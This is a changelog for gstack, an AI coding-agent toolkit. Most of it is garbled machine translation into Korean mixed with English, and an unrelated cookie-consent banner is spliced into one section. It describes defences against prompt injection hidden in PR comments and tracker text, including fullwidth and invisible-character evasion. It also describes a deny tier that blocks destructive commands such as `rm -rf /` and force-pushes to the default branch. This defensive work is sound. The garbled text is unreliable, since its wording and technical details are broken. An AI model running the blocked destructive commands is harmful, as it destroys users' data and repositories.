  (#2314) - 그리고 그 범위는 지금 49151에, 실제로 macOS ephemeral 수영장 그것 피하기 위하여 존재합니다; 부트는 죽기 대신에 경주한 묶음을 retries. Windows 끝 에이전트 누출을 통해 고쳐진 `process.kill(pid, 0)` liveness (#1952) 및 과실 처리 도움자. @SYKhayat에 의해 공헌하는
  (#2414).
- daemon 크래시는 토큰이나 불합성 페이지 내용 없이 지속됩니다.
  (needle-tested). @phuttimatebenchanakatkul (#2461)에 의해 기여.
- 죽은 보안 보호 표면은 끝이 제거되었습니다 (- 272 그물 선) 동안
  L4 sidecar 경로는 상태 종료점 - 같은 커밋에서 업데이트된 문서를 유지합니다. @frederik-kaster-noygear (#2557, #2559)의 파이프 캡쳐 코어와 함께 CDP `Emulation.setEmulatedMedia`가 allowlist에 참여합니다. @meshailabs (#2419)에 기여했습니다. Windows yutons/> probe (probe)는 @probe (probe)에 의해 기여합니다.
- 먼저 `patchedDependencies` 항목: playwright-core의 두 Windows 스파드
  사이트가 `windowsHide` (#2160, #1989), statically 핀으로 꼿고 자주적으로 뒤집을 수 있습니다.

### Fixed — 설치 및 설정 수정

- Root-alias 기술은 rewritten 복사로 설치, 편집하는 아무 것도 symlinks
  생성된 소스(#2511, #2201)를 손상시킬 것입니다. Windows 재 실행은 실제 디디렉토리 설치(#2444)를 새로 고침하고 BOTH 재고 경기와 생성-바너 검증 게이트, 목록(이중 디테일)를 전달하는 유일한 디렉터리를 삭제합니다. (#2563).
- `--host cursor` 전체 설치 슬라이스를 가져옵니다 - @szsunyuan에 의해 기여
  (#2547). 설정 후크 데듀업은 @gregario (#2431)에 의해 기여한다. `:user`는 `--out-dir` (#2569)을 통해 경로 렌더링을 통해 다리의 정수를 제거하는 마이그레이션을한다. 설정-gbrain invocation 경로 고정 (#2250) - @SomSamantray (#2409)에 기여. #2409 (>)> (>). codex/factory/opencode (>).
- redact pre-push hook은 opt-in을 유지하지만 실패 개방 간격은 닫힙니다,
  한 번 동의 프롬프트 (#1946). 스킬 타임 라인 스톱 후크는 설정 등록 (#2553)과 실패 (알로 출구 0, 2s 예산)를 발송합니다.
- iOS QA: DebugBridgeTouch는 릴리스 빌드에서 컴파일한다. — 기여한
  @Bastea (#2585); 프론트-most 브리지 주문 - @IDSTUK (#2397); compat preflight docs - @itstimwhite (#2581)에 의해 기여.

### 고정 - 메모리 및 GBrain

- Windows 슬러그 해상도와 의사 결정.jsonl allowlist (#2396) —
  contributed by @source-utsho (#2561). Brain-sync arithmetic-injection guard — contributed by @sneakygriff (#2588). Windows bash routing for brain-sync/gbrain — contributed by @ShahriarLak (#2510), extended to every gbrain-sources spawn (#2471). `--full` walks the full tree — contributed by @ShahriarLak (#2406). Honest "missing" from brain-cache — contributed by @sneakygriff (#2587). Memory-ingest parses both codex rollout shapes and stages outside GSTACK_HOME (#2105, #2104).
- gbrain 검출: 엔진 잠금은 건강 상태 (#2456), 곰 팡이
  얇은 클라이언트는 인정 (#2520), GBRAIN_HOME는 .gbrain 세그먼트 (#2521), 프로젝트-경화 MCP 등록은 명예를 받습니다 (#2499). 소스 핀은 @exGeni (#2417); `--dry-run`가 오프라인 (#2536)에 의해 - @CarringtonCreative (#2540); bun-PATH (PATH)에 의해 공헌했습니다. PATH는 (PATH)를 가르쳤습니다.

### 고정 - 버전 도구, 디프스코프, 중복

- VERSION는 진실의 4 자리 소스를 유지합니다; package.json는 나르습니다
  npm-valid 3-digit translation, lockfiles sync only when they already exist, and drift is judged on translated forms. Built on re-derived work contributed by @YiftahR (#2501), @ortonom (#2568), and @CarringtonCreative (#2531, #2545). Pinned repos compare base and current against the SAME file (#2462). JSON version-paths get honest per-file recovery messages. 경로 핀 (`.gstack/version-path`, `.gstack/package-json-path`)은 저장소를 탈출 할 수 없습니다 - 절대 경로, `..` 트래버스, 그리고 symlink 탈출은 모든 거부, 그리고 repo 외부의 잠금 파일 symlinked 경고로 건너 뛰고 있습니다.
- 디프스코프는 api/*, 이주/*, db/data, 노매치 출구와 더불어
  코드와 uncommitted-work 처리 (#2526, #2455, #2299). 적분 검사는 합병 기초 범위를 검사하고 소포 ID가 전화 번호가 아닙니다 — @Two-Six-Alpha-1115 (#2592, #2591); 근거한 힘 소진은 시험 (#2573)에 의해, 입증된 정확하게 검사됩니다.
- codex 모델 probe는 두 가지 방법을 다루어줍니다.
  시간, 15 분 동안 세례 모델-400 (config.toml 재 프로브 즉시) - 그래서 영향을받는 계정은 검토 섹션 (#2477) 당 30s 왕복을 지불 중지합니다. 그것의 타임 아웃 래퍼는 지금 재고 macOS에 bash-native watchdog와 함께 마감을 강제합니다. no 타임 아웃 바이너리가 존재합니다.

### Fixed — 템플릿 및 기타 모든 것

- Codex에서 실행되는 기술은 인쇄된 배열된 코덱 전문가를 건너 뛰습니다
  notice (#2519). Codex web-search flag unified behind one resolver constant across 19 sites (#2525). Slugs are sanitized in every path position (#2550) — with groundwork contributed by @harjothkhara (#1851). AGENTS.md routing probe — contributed by @gamerey43 (#2500); empty-find fallthrough killed — contributed by @tranthanhnhatkhoa (#2483); cygpath MSYS builds — contributed by @chiragborse1 (#2452). /ship's review army loops until clean (#2391). Question-registry path is absolute (#2489). Retro glob (#2552), 기능 검사 임시 직원 파일 (#2503), repo 형태 통계 순서 (#2195), hover doc 주 (#2445), make-pdf boolean 플래그 - `--strict` 및 `--confidential` - no 더 긴 입력 파일을 삼키는 감시 시험과 더불어, 근원 (#2514)에서 놓인 깃발을 파생하십시오.

#### 기여자

- Test/generator 적외선이 먼저 단단히 덮인: host-config 황금색화 (#2532),
  신비한-wiring tripwire와 YAML ellipsis 인용 — @sneakygriff (#2586, #2589); prepush PATH 분리기 - @luckywenapere (#2544); gen-skill-docs는 중복 preamble 토큰에 던졌습니다.
- 의존성 위생 : puppeteer-core는 outright 제거 (제로 소비자),
  adm-zip CVE 잠금을 통해 닫힌 오버라이드 - @anupamme (#2485); transformers/marked/socks sidecar 연기 녹색으로 범퍼 LF 핀에 의해 기여 - @mlaniak (#2527); GitHub 액션 범프 - @dependabot (#2594)에 의해 기여.
- 파의 자체 모험 리뷰 (Codex + Claude, 28 찾기) 착륙
  수정을 방지; 검증 된 잔여는 합리적 인 TODOS.md에서 파일됩니다.

## [1.66.1.0] - 2026-08-16

**모든 클레임 gstack는 이제 컨텐츠에 바인딩되어 있었습니다.** **Tracker 텍스트는 데이터입니다. Guard Hooks는 실제로 감시합니다.**

"review is 최근"라는 주장에 사용되는 리뷰 및 테스트 결과는 rebase가 충돌 할 수 있음을 의미하며 "tests passed"는 나무에서 출력을 신뢰하지 못합니다. 이제는 작동 트리 콘텐츠 지문 (`bin/gstack-wtree`, ~0.2s)을 수행합니다. Rebases, amends 및 Squashes를 통해 동일한 내용 등급 CURRENT의 검토. `bin/gstack-evidence` ledger가 /ship의 검증 게이트에서 인용할 수 있는 테스트가 진행되며, 내용이 바이트 IDentical (release file carve out)이며, 명령 해시 경기는 아무것도 트리 중간 실행을 편집했습니다. /ship 및 /land-and-deploy는 재 실행 대신 신선한 증거를 인용하고, 어떤 이동할 때 재 실행됩니다.

PR bodies, PR comments, and model-judged issue titles now enter agent context only through a trust envelope (`bin/gstack-issue-guard`): content is data even when clean, injection-shaped lines get labeled through fullwidth and invisible-character evasion, forged envelope banners are defused, and a CI scanner fails the suite on any raw tracker-text read at all 8 ingress points. Write-backs keep a raw artifact so envelope markup can never reach a live PR.

/freeze now fails closed: unparseable payloads, quote or newline paths (the deny used to silently no-op on them), boundaries with spaces, symlinks pointing outside the boundary, and a broken install all block instead of passing. /careful gains a hard-deny tier for `rm -rf /`-class deletes and force-pushes to the default branch — including the flag-less `git push origin +main` form and quoted or refspec targets — plus additive-only custom warn patterns that can never weaken the built-ins.

### 중요 한 숫자

branch; `bun test`, `time bin/gstack-wtree`, 각 bin의 헤더의 명령으로 다시 실행.

| Metric | 의 전 | 후지후 | Δ |
|---|---|---|---|
| rebased/amended 동일한 내용에 staleness를 검토하십시오 | 충돌 또는 STALE | CURRENT | correct |
| "시험 통과" 바인딩 | none (프로세스) | 내용 지문 + 명령 해시 + 최대 일 | 의 새로운 |
| Tracker-text 진입점이 덮여 | 0 | 8, CI-scanner 시행 | 의 새로운 |
| /freeze hostile/edge 경로에 deny | 자가용 | 블록, 실패 닫히는 | fixed |
| 작업 트리 지문 비용 | — | ~0.09s 따뜻한 (기사 캐시, 40x 대 네이티브) | 의 새로운 |
| Adversarial는 고정된 전 merge를 찾는다 | — | 50 (4 전문가 + 레드 팀 + 신선한 텍스트 패스), 6 중요 | — |

지문은 동일한 내용의 커밋을 살아남기 때문에 일반적인 흐름 - 더러운 나무에 대한 테스트, commit, 배 - 증거를 검증 유지, 하나의 untracked 새로운 소스 파일이 유효하지.

### 너를 위한 이 뜻

/ship stops re-running suites the content already proved green and stops trusting suites the content has outgrown — the IRON LAW is now a mechanical check, not an honor system. A hostile PR comment can no longer speak to your agent with authority, and /guard's boundary actually holds on the paths where it used to silently fail. Nothing to configure: the bins ship wired into /ship, /land-and-deploy, /review, /spec, and /document-release.

### 항목화 된 변경

### 추가
- `bin/gstack-wtree` - 작업대 내용 지문 (temp-index, stat-cache-seeded; ~40x 더 적은 비용으로 가득 차있는 재 해시에 동일한 해시.
- `bin/gstack-evidence` — verification-evidence ledger: `run` wraps any command transparently (exit code always passes through; 0600 per-run logs with 2MB cap and 30-day prune; HIGH credentials in commands stored redacted; mid-run tree edits void the fingerprint) and `check` grades FRESH/STALE/MISSING per label with `--expect-cmd`, `--max-age`, and `--allow-paths` binding.
- `lib/tracker-guard.ts` + `bin/gstack-issue-guard` - 트래커 텍스트에 대한 신뢰 봉투 : 봉투 통로, 탐지 전용 NFKC + 전체 유니코드 형식 자동 스위퍼, 배너 위조, no-envelope-on-fetch-failure, 숫자 argv 유효성.
- `/careful` HIGH tier (hard deny: root/home 재발성 deletes incl. `--no-preserve-root` 및 `/*` 형태; 과도한 힘 소각 incl. plus-refspec, refspec-colon 및 인용된 표적; 간단한 명령만, `--force-with-lease` 결코 일치하지 않는) 및 첨가물 전용 프로젝트 warn 본 (`~/.gstack/careful-patterns.txt`, per-project 변종).
- CI 배선 스캐너 (`test/tracker-guard-wiring.test.ts`) 원시 추적기 텍스트에 스위트를 실패는 가드 밖에서, 소멸, 생검 검사 된 면제; 그라딩 규칙 및 쓰기 측면 배너 여행 와이어를 핀으로 템플릿 드립 삼각 삼각대.

### 변경
- 검토 레코드 (`bin/gstack-review-log`) 스탬프 `commit_full`/`tree`/`dirty`/`wtree` 저자적으로 - 콜러 공급 바인딩 필드는 무시됩니다; `bin/gstack-review-read` 방출 `---WTREE---`/`---TREE---`/`---DIRTY---`; /ship 대쉬보드 및 /land-and-deploy 등급 디프-스코프 리뷰 내용-첫번째 (플랜 층별 리뷰는 시간 기반 논리, 그리고 UNKNOWN의 등급을 유지하십시오. /ship 대쉬보드 및 /land-and-deploy 등급 디프-스코프 리뷰 내용별 (플랜 층별 리뷰는 시간 기반 논리, UNKNOWN).
- /ship 단계 5 시험 차선은 per-lane 상표로 감싸고 per-run 통나무 (no는 동시 배 사이 /tmp 충돌을 공유했습니다); 단계 16와 /land-and-deploy 3.5b는 ledger를 첫째로 확인하고 신선한 증거, 고문 never 막기 표를 검사합니다.
- /document-release PR/MR 바디 업데이트는 fetched Original에 비해 배너 트립 와이어와 함께, 결합 및 쓰기 백의 원시 복사본을 사용하여 두 개의 artifact 흐름을 사용합니다.
- /spec 문제-title dedupe는 envelope를 통해 타이틀을 읽고, 침묵적으로 건너뛰기 대신 0개의 경기에서 파이프라인 실패를 구별합니다.

### 고정
- /freeze: 5개의 경계선 결점 — deny JSON는 따옴표/newline 경로에 자동적으로, 경계선 경로에 있는 내부 공간은 벗겨졌습니다 (공간 방위 프로젝트 디rs는 결코 일치할 수 없었습니다), symlink 마지막 성분은 결심되지 않았습니다 (바운드 symlink에서 썼습니다), JSON는 탈출한 따옴표에 truncated, 실패한 열리고, 끊긴 파일의 대신에 돕는 파일 차단을 통해 돕습니다.
- /careful와 /freeze는 이제 1개의 JSON 추출기 및 1개의 분석 작가 (보그 명예 `GSTACK_HOME`)를 공유하고, 1개의 걸이가 다른 것을 고쳐 버리는 2 사본 편류를 끝내.

### 기여자
- `test/helpers/scratch-repo.ts` — 공유 신비한 git 정착물 (특허가 핀으로 꼿는, gpg 표시는 가동자의 gpg 에이전트을 불문하지 않습니다) 및 실제 gh 성공을 exercising를 위한 PATH `gh` shim를 붙입니다/failure branch.
- ~150 키스톤 케이스를 포함한 6개의 파일에 대한 새로운 테스트: 더러운 나무에 기록된 증거는 정확한 테스트 내용을 투입한 후 FRESH를 유지합니다.

## [1.66.0.0] - 2026-08-15

**약 90초 만에 전체 ~7,000 테스트 스위트, 정직 확인.** **diff로 결제된 evals는 $38가 아닌,**

`bun run test` used to take 454 seconds. It now runs as up to six concurrent shard processes and finishes in about 90 to 100 seconds, under a strict output contract: a shard that exits without bun's own terminal summary line is a failure, a wedged shard is killed at a size-scaled deadline and named in the epilogue, and the console shows only what you need (per-shard status, then `✗ file — test name` for anything red, full stream in a per-run log, `--verbose` for the firehose). no 스크립트와 no CI의 밑에 ran가 있는 Twelve 시험 파일은 안으로 타전됩니다. 3,372 선 죽은 타원형 monolith는 삭제됩니다, 4개의 결코 달리는 시험과 더불어 그것에서 부활했습니다.

이 웹 사이트는 귀하가 웹 사이트를 탐색하는 동안 귀하의 경험을 향상시키기 위해 쿠키를 사용합니다. 이 쿠키들 중에서 필요에 따라 분류 된 쿠키는 웹 사이트의 기본적인 기능을 수행하는 데 필수적이므로 브라우저에 저장됩니다. 또한이 웹 사이트의 사용 방식을 분석하고 이해하는 데 도움이되는 제 3 자 쿠키를 사용합니다. 이 쿠키는 귀하의 동의하에 만 브라우저에 저장됩니다. 이러한 쿠키를 거부 할 수도 있습니다. 이러한 쿠키 중 일부를 선택 해제하면 검색 환경에 영향을 미칠 수 있습니다.

### 중요 한 숫자

이 지점에서 측정. `time bun run test`와 `bun run eval:select`로 재 실행; `~/.gstack-dev/evals/`에서 라이브 eval 영수증.

| Metric | 의 전 | 후지후 | Δ |
|---|---|---|---|
| 무료 스위트 벽 시계 (~7,000 테스트) | 454s의 | ~90-100s의 엄격한 증명 | ~4.7x(일) |
| Linux CI 적용을 가진 무료 테스트 파일 | 0 | ~420, 필수 PR 체크 | 의 새로운 |
| 한스킬 편집의 유료 비용 | ~$38 (전체 스위트) | 4 의 45 shards, $0.67 | ~57x의 |
| 가장 느린 CI eval 일 | 741s의 1개의 직렬 파일 | 3 건, 각 ~250 s | ~3x의 |
| 유료 재량 증폭 | `--retry 2`, 측정되는 +84% | `--retry 1` | 반세기 |

$0.67 행은 생후의 재활이다, 투영되지 않음: `qa/SKILL.md.tmpl` 177의 17를 선정한 찰상, 45의 shards의 ran 4, diff로 건너뛰는 41, 그리고 /qa E2E는 통과했다.

### 기여자에 대한 의미

현재 일정에 사용되었던 것은 생각 안에 맞습니다. `bun run test` 전에 commit는 ~90 초에 실제 습관이 다시, 정확한 테스트를 빨간색으로 이름을 붙이고, 녹색은 실제로 ran를 의미합니다. 포크 PR은 새로운 비밀없는 Linux 차선에서 진정한 테스트 신호를 얻습니다. 변화와 eval 계산서를 발송하면 폭발 반경을 추적합니다.

### 항목화 된 변경

### 추가
- Linux 무료 테스트 CI 라네 (`.github/workflows/free-tests.yml`): 모든 PR에 전체 무료 스위트 및 매일 1, 0 비밀, 최소 -privilege token에서 필요한 모든 push 및 각 push에 전체 무료 스위트, `test/free-tests-workflow-wiring.test.ts`에 의해 핀으로 꼿는 배선.
- Diff 기반 유료 샤드 선택 : `skipped-by-diff` 과세 및 선택 배너가 이유를 명명하는 부모의 측면. (`scripts/test-paid-shards.ts`).
- 선택 데이터 자체에 대한지도 디프 선택 : `test/helpers/touchfiles-data.ts` 재 실행 만 added/changed/retiered 키 (예 : `git show` + 분 아이를 통해 평가 된 오래된 버전; `test/touchfiles-map-diff.test.ts`의 adversarial 정착물.
- 선택 조합은, staged/unstaged, untracked changes; git failure throw naming `EVALS_ALL=1` (fail closed), 그리고 비ASCII 파일명은 올바르게 선택한다 (`core.quotePath=false`).
- `test/helpers/skill-fixture.ts`: E2E 정착물은 SKILL.md 단면도를 1,800 선 파일 복사 대신에 시험 필요를 추출합니다 — 9개의 정착물 위치는 58-97%를 삭감했습니다.
- `GSTACK_EVAL_MODEL_JUDGE`는 LLM-judge 모형을 위한 override를 env; per-kind `GSTACK_EVAL_MODEL_<KIND>` 과다리를 가진 `lib/eval-model.ts`에서 집중된 eval 모형 해결책.

### 변경
- 무료 스위트 아키텍처 : N 동시 shard 프로세스 (각 내에서 공중); 나무 순환 테스트 및 트리 메스 트 리더 병렬 단계 후 1 직렬 shard에서 실행, 그래서 측정 결코 재생 경주하지. Shard curation 목록은 라이브 파일 인구 조사에 대해 핀으로, 벽 마감은 shard 크기로 스케일.
- 에이전트 SDK 캡처 default Opus → Sonnet (D1a). 재판관 default는 Sonnet을 유지한다: 건강 루비에 살아있는 A/B는 Sonnet의 4/3/4,에 대한 Haiku 2/2/2를 득점했다 그래서 하향은 D1a의 회귀 절 (`test/helpers/llm-judge.ts`에 있는 영수증) 당 핀이 핑되었다.
- 4 비싼 자세 테스트 데모 게이트 → 주기 (D2a).
- 유료 주자 : `EVALS_JOBS` (shard process count)는 `EVALS_CONCURRENCY` (within-shard), `--retry 1`의 모든 재량 배당 경로에, 1개의 전광 API 핑 당 ~30의 대신, `test/eval-detach-timeout-floor.test.ts`에 의하여 살아있는 shard 조사에 대하여 강제되는 각 주 시간의 바닥에 핑을 꼿습니다.
- CI: eval Docker 이미지 캐시는 Dockerfile + bun.lock에 열쇠를 붙였습니다 그래서 버전 범프는 그것을 재건합니다; Bun 1.3.13 이미지; `skill-e2e-review`는 3개의 모체 shards로 나누십시오; actionlint는 digest-pinned prebuilt 이미지를 실행합니다; 5개의 단 하나 핵심 일 크기; lint와 기술 문서는 각 PR commit commit를 멈추고, 대신에 있는 문이 있는 목록과 마개를 놓습니다.
- Skill-routing E2E 정착물은 기술 머리를, ~18 가득 차있는 SKILL.md 파일을 설치합니다.

### 고정
- Ctrl-C는 실제로 실행 취소 : 신호 전달자는 이제 부모의 자신의 출구를 일정하고 두 개의 shard 풀은 `SIGINT` / `SIGTERM`에 새로운 작업을 시작 중지 - 이전에 부모는 현재 아이를 살았고 API-burning shards를 파괴했습니다.
- 간헐적인 전체적인 쐐기: `browse/src/browser-manager.ts` `close()`는 가까운 인종의 앞에 Chromium 아이를 붙잡고 가을 뒤의 단위 적용과 더불어, 웅대하게 닫히는 시간 때 SIGKILLs 그것 붙잡습니다.
- 엄격한 산출 분류기는 stdout와 stderr 선 집합을 분리해, 그래서 interleaved 관 덩크는 실패 선을 숨길 수 없습니다 또는 가짜는 truncation를 숨길 수 없습니다. Windows shard 살인은 또는 거대를 하거나 입히기 대신 전체적인 과정 나무 (`taskkill /T`)를 가지고 갑니다.
- Redaction 교정: `${var}` 템플릿 간섭과 ALL-CAPS `USER:PASSWORD` doc placeholders no 더 긴 구획 푸시, bare `$word` 암호 및 리터럴 하부 `password`/`pass`에서 URL-password 위치에 아직도; 두 연결 끈 유효기는 편한 돕기 이렇게 공유할 수 없습니다.
- Supabase 풀러 DSNs %는 암호 세그먼트를 인코딩, `wait --timeout` 영원히 오염 대신 비 숫자 값을 거부, 응답 몸은 전송 오류로 재부를 읽고 CLI 엔트리 포인트는 종료하기 전에 stdout 배수를 허용한다.
- 유료 스위트 프리프라이트는 누락된 `claude` 이진, 스파드 오류 또는 타임 아웃에 빠지지 않습니다. shard 당 한 번 부모 대신 아웃시 표면.
- 다른 포크의 동일한 이름 branch는 no 더 긴 취소 각 다른 CI 실행 (무료, eval 및 Windows lanes의 맞은편에 PR 수에 암호 그룹 열쇠)를 운영하고 있습니다.
- 선택 무결성: `touchfiles.ts` 정면, `e2e-helpers.ts`, `paid-test-set.ts`는 세계적인 접촉 파일입니다 (선택 방향 코드에 편집은 결코 선택할 수 없습니다); 중복 접촉 파일 열쇠는 스위트 실패합니다; 그들의 자신의 의존성 지도에서 rehomed E2E 파일 목록 그들자신; retro E2E는 디스크에 보고를 요구합니다.
- 26개 기록된 실행에서 결코 통과하지 않은 간헐적인 컨텍스트-save-list eval 테스트는 이제 패스를 전달합니다.
- `variants-retry-after` HTTP-date 조각; 워치독 E2E 22.7s → 1.5s; supabase-provision 시험 16.5s → in-process TS 항구를 통해 0.45s.
- `package.json` 버전은 VERSION에 대하여 편류합니다.

### 기여자
- `test:gate:sharded` / `test:periodic:sharded`는 sharded 유료 주자; `eval:bg:*` 포장은 `gstack-detach`에서 1 층 시계 독과 기계 넓은 `gstack-evals` 자물쇠로 실행합니다.
- 5개의 사전 노출 환경 실패는 파일 영수증과 개별적으로 quarantined; 두 개의 죽은 사건 안전 계약은 삭제했습니다.
- `test/e2e-tier-alignment.test.ts` tier 선언을 시행하고 sharded-runner mapper가 게이트 파일을 볼 수 없을 때 지방으로 실패합니다.

## [1.65.0.0] - 2026-08-14

**/autoplan, /codex on macOS, 그리고 기억은 다시 작동합니다.** **그리고 모든 동의 문은 이제는 무슨 말을 의미한다.**

GStack 2 포크 포트의 두 번째 및 최종 파입니다. Wave one (v1.63.0.0)는 감사 인프라를 가져 왔습니다. 이 파는 수정과 기능을 취합니다. 이제 모든 실행에 침묵하지 못하는 세 가지 기술이 작동했습니다. /autoplan의 작업 집계는 0 대신 실제 작업을 방출합니다. /codex는 BSD mktemp, 그리고 실제로 페이지에 메모리를 생성 할 수 있습니다. 현재는 gb의 상단에 표시되어 있습니다. 브라우저 auth는 이제 daemon 재시작을 살아남을 수 있습니다. /ship는 작업 트리에서 검토를 제출할 수 있으며, 4개의 공급망 게이트가 이제 PR에서 실행됩니다. Sina Matian의 시간-attack/gstack fork로 돌아올 때마다 테스트와 기여를 받아 들일 수 있습니다.

### 중요 한 숫자

출처: 이 branch (`git log 1.63.0.0..HEAD`, `git diff main...HEAD --stat`, `bun test`), 그리고 GitHub는 방출이 닫힙니다.

| 이란? | 의 전 | 후지후 |
|------|--------|-------|
| /autoplan 단계 4 작업 출력 (#2018) | 0개의 작업, 각 실행 | 모든 작업 |
| /codex macOS (#2091) | 모든 설치에 끊기 | works |
| gbrain 0.42+ (#2144)에 있는 기억 ingest | 0 페이지, 보고된 성공 | 전체 corpus, 인쇄 된 수 |
| Headed macOS 26 (#2242)에서 찾아보기 | GPU 충돌, 독된 캐시 | 발사, 치유 오래된 캐시 |
| 검색 후 Auth daemon 재시작 (#778) | logged out | 복원 (opt-in) |
| CI PR diffs에 비밀 검사 | none | PR, 실패 닫히는 |
| GitHub 문제 닫힘 |  | 24 |
| 커뮤니티 PR은 Authorship에 착륙 |  | 4 |

stark는 첫 번째 세 행입니다 : 그는 등급이되지 않은 기능, 그들은 녹색 체크 마크로 빈 결과를 반환하는 기능이 있었다. 만약 당신이 ran /autoplan 마지막 2 개월에서, 작업 목록 그것은 빈 빈하고 아무것도 말했다.

### gstack 사용자를 위한 이 뜻은 무엇입니까

/autoplan와 파이프라인의 손 실제 작업을 실행합니다. Mac에서 /codex를 실행하고 그냥 작동합니다. `BROWSE_PERSIST_STATE=1`를 설정하고 daemon는 no를 다시 시작합니다. 당신은 iOS 앱을 발송하면 `/ship`는 이제 전체 앱 스토어 여행, 세션 - 분화 된 업로드 키, 부서진 fastlane 경로, 오류 -22PH를 대체하는 가격 - 일정 API를 알고 있습니다. `/gstack-upgrade`는 현재 5 ~ 22 의 저자와 함께 업그레이드합니다. 마이그레이션은 Chromium 묶음을 더 오래된 gstack 끊어지고, 그 전에 교체 다운로드를 삭제합니다.

### 항목화 된 변경

#### 추가

- **Opt-in 브라우저 세션 지속** (#778, #2193): `BROWSE_PERSIST_STATE=1`
  스냅 샷 쿠키 및 탭 (원료 쓰기, 0600, 절대 페이지 HTML 또는 소유권), 다음 시작의 부팅 경로에서 복원, 그리고 충돌 대신에 손상 snapshot. 시간 - attack/gstack에서 포로.
- **Apple App Store 출시 여행 /ship**: `ship/sections/apple-release.md`
  대상이 Apple 앱일 때 repo 착륙 게이트 전에 로드합니다. 세션 - 분화 된 앱 스토어 연결 키, `appPriceSchedules` 끊어진 fastlane `price_tier` , 확장 된 나이 측정 속성, -22938 분류 및 원화 흐름을 인코딩합니다. 포크에 21 라이브 릴리스를 통해 재화. 포스 저작권 Sina Matian, MIT.
- **Code-intelligence 공급자 계약, 단계 1**: `gstack-code-intelligence`
  wraps GBrain, Sourcebot, and Graphify behind one interface with an ask-once indexing offer for large repos (1,000+ tracked files, decline persisted). Consent is explicit per repo (`consent <repo> yes|no`), the per-repo trust policy's deny and read-only tiers veto write-class operations no matter what consent was recorded, and every off-machine send writes an egress receipt that records the consent state actually checked. Portions from time-attack/gstack.
- **공급 사슬 CI**: 각 `bin/gstack-redact`를 실행하는 질 문
  PR diff (HIGH는 실패, MEDIUM annotates), lockfile 변경에 의존성 검토, 주간 OSV 검사, 그룹화 된 Dependabot 업데이트 및 증거 막대기 PR 템플릿. 새로운 워크플로의 모든 타사 작업은 commit SHA에 핀이 됩니다.
- **제3자 웹 활동 계약** tier-2+ 기술: 워크플로우가 필요한 경우
  공급업체 사이트 단계(API 키 가입, OAuth 앱), gstack는 브라우저 자체, 손 압착 및 CAPTCHA를 구동하기 위해 제공되며, 비밀 소유자 전용을 저장하고, read-only 호출을 호출하여 성공 주장하기 전에 확인합니다.
- **repo에서 docs 토지 설계** (#703, #2000): 사무실 시간 쓰기
  `docs/designs/<topic>.md`는 정교한 결정 기록 (원단한 이유에 대한 결정 당 1개의 탄알), 당신의 git 역사에 어떤 접촉하기 전에 적색. 계획 리뷰는 모두 존재하는 때 repo-local doc을 선호합니다.
- **`gstack-verify-gate`** (opt-in 스톱 후크) : 블록이 턴 엔드까지
  CLAUDE.md-declared check command pass. 명령은 repo (`--trust`)에 한 번만 신뢰한 후, 재 위탁이 변경될 때 요구됩니다. 모든 보조금은 감사 기록되고, 재입력은 그것을 통해 빙하 대신 검사를 재 실행합니다.
- **"이번 다시 나를 보여"** 설립자 자원 피치 (#538) :
  옵트아웃은 어떤 것을 유망하기 전에 자체 설정 쓰기를 정의합니다. `gstack-config set founder_resources true`로 다시 사용 가능.
- **제한은 증거가 필요합니다.**: 지금 각 층 2+ 기술은 “the를 대우합니다
  API는 동사적 오류, 문서화 된 성명, 또는 살아있는 probe를 요구하는 재료로이 작업을 수행 할 수 없으며, 어떤 차단을 선언하기 전에 10 초 체크를 실행합니다.

#### 고정

- **/autoplan 4 단계는 각 뛰기에 0개의 일을 방출했습니다** (#2018): jq 컨텍스트
  재봉된 모든 골재 작업을 떨어졌다; 오류는 stderr 억제에 의해 숨겨졌다. 6 개의 고정 회귀 스위트 핀.
- **/codex는 각 macOS 설치에 끊었습니다** (#2091): BSD mktemp 거부
  suffixed 템플릿; 모든 임시 파일은 이제 휴대용 템플릿과 정적 테스트를 금지합니다 패턴을 repo-wide.
- **메모리 ingest는 gbrain 0.42+에 아무것도 수입했습니다** (#2144): 노후화 디디
  gitignored 트리 아래 앉아, 그래서 git-aware 수집가는 0 파일을 보았다. `--include-gitignored` (커뮤니티 PR #2560)과 `GIT_CEILING_DIRECTORIES` 두 번째 층, Windows-safe 및 큰 ingested-page 카운트와 함께 고정.
- **Headed 모드 macOS 26** (#2242, #2138, #2139): gstack no 더 긴 재쓰기
  서명된 Chrome-for-Testing 번들 (Rebrand는 코드 서명을 부각합니다; GPU 프로세스는 시작을 거부했습니다). 자동 치유 독된 캐시를 발사하여, headed 항목 모두에서 전체 개정 디렉토리를 제거하여 재-fetch 실제로 재 다운로드를 다시 다운로드하고, 업그레이드 마이그레이션은 기존의 설치에 동일하며, 작업 Chromium가 성공하기 전에 존재합니다. GStack 브라우저 랩퍼 앱에서 브랜드 숙박.
- **`browse stop` daemon를 다시 시작했고, 중지되었다**: CLI 이제 얻은
  폐쇄 전에 acknowledgment, 및 폐쇄 snapshot는 단단한 마감이 그래서 쐐기 페이지는 항구를 붙들 수 없습니다.
- **내부 네트워크의 세션 쿠키는 복원 된 브라우저에 도달하지 않습니다.**:
  복원 시간 위생 필터 방울 루프백 및 링크 - 지방 IP 리터 (127.0.0.1, :: 1, 169.254.*) localhost와 함께*.internal, persistence path 및 `state load`.
- **ios-qa는 원시 곰 꾼 토큰을 핸딩 중지**: `/auth/sessions` 반환
  소금이 뾰족한 token ids with revoke-by-id support, boot token left os_log totally, 그리고 소켓에서 루프백에 IPv4 청취자 핀.
- **make-pdf의 no-network 약속은 obfuscation에 대하여 붙듭니다**: `<style>`
  @import, 인라인 스타일 URL (예를 들어, unquoted, CSS-escaped, 그리고 HTML-entity-encoded), srcset 및 미디어 소스는 `--allow-network`없이 불신명한 HTML를 렌더링 할 때 모든 neutralized입니다.
- **쌍 에이전트 터널은 동의 - gated** (`gstack-config set pair_agent on`):
  터널은 기록 된 선택이 없지 않고 시작 할 수 없습니다. 항상 주장 된 동의는 현재 존재 확인을 반영하고, 장애인 게이트는 ngrok 대신 실제 치료법을 알려줍니다.
- **per-repo gbrain 신뢰 정책은 코드-import chokepoint에 시행됩니다.**
  (#2140, 동기화 경로): 거부, read-only는 코드 ingest를 건너, 읽을 수 없는 정책 상점은 닫히지 못하고, egress 영수증은 결정.
- **Handoff no 더 긴 터널 - 오르판 reaper를 파괴** (커뮤니티 PR #2565
  더 강하게 하는): daemon를 headed에 승진시키기 위하여는, 머리로 shutdown branch만 억압합니다; 활동적인 터널를 가진 daemon는 아직도 그것의 부모로 죽습니다.
- **Windows**: 주 디어 각자 재선에 끊긴 DACLs (#1605), 매
